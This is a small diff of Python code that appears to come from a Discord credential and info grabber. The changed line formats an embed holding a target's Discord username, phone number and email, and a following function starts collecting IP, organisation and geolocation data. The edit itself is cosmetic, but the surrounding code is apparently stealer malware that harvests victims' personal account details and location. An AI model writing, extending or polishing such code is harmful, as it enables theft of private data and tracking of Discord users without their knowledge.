@@ -83,7 +83,7 @@ def accinfo():
         phone = r.json()['phone']
         email = r.json()['email']
                 
-        embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}") 
+        embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}", inline=False)
     
 def get_loc():
     ip = org = loc = city = country = region = googlemap = "None"
